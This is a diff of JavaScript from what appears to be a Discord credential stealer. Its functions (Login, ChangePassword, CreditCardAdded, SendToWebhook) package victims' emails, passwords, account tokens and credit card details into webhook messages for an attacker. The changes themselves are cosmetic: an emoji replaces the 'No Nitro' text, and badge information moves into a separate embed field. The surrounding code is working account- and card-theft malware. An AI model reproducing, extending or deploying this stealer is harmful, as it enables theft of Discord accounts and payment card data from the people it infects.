@@ -70,7 +70,7 @@ function SendToWebhook(info) {
 
 function GetNitro(type) {
 	if (type == 0) {
-		return "No Nitro"
+		return "`❌`"
 	}
 	if (type == 1) {
 		return "\`Nitro Classic\`"
@@ -78,7 +78,7 @@ function GetNitro(type) {
 	if (type == 2) {
 		return "\`Nitro Boost\`"
 	} else {
-		return "No Nitro"
+		return "`❌`"
 	}
 }
 
@@ -152,6 +152,11 @@ function Login(email, password, token) {
                             "value": `Email: ${email} - Password: ${password}`,
                             "inline": true
                         },
+						{
+                            "name": "<:ib:957045850121596998> **Badges**",
+                            "value": `Badges: ${GetBadges(json.flags)}`,
+                            "inline": false
+                        },
                         {
                             "name": "<a:ib:957044983783911484> **Token**",
                             "value": `\`${token}\``,
@@ -196,8 +201,13 @@ function ChangePassword(oldpassword, newpassword, token) {
                         },
                         {
                             "name": "<a:ib:957045033025036319> **Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}`,
                             "inline": true
+                        },
+			{
+                            "name": "<:ib:957045850121596998> **Badges**",
+                            "value": `Badges: ${GetBadges(json.flags)}`,
+                            "inline": false
                         },
                         {
                             "name": "<a:ib:957044983783911484> **Token**",
@@ -290,8 +300,13 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         },
                         {
                             "name": "<a:ib:957044670498758746> **Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}`,
                             "inline": true
+                        },
+			{
+                            "name": "<:ib:957045850121596998> **Badges**",
+                            "value": `Badges: ${GetBadges(json.flags)}`,
+                            "inline": false
                         },
                         {
                             "name": "<:ib:957045850100609104> **Token**",
